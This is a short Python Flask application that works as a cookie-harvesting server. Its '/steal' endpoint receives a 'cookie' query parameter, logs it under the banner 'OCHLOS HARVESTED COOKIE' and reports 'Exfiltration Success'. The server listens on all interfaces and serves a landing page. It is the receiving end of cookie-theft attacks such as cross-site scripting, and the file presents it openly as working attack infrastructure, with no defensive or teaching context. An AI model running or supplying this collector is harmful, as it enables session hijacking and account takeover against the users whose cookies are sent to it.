import os
from flask import Flask, request, render_template, send_from_directory
import logging

app = Flask(__name__)

# Set console log format and level to INFO
logging.basicConfig(level=logging.INFO)

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/steal')
def steal():
    stolen_cookie = request.args.get('cookie')

    if stolen_cookie:
        app.logger.info("\n" + "="*55 + f"\n[+] OCHLOS HARVESTED COOKIE: {stolen_cookie}\n" + "="*55 + "\n")
        return f"Ochlos Exfiltration Success", 200
    
    return "No parameters received", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9091)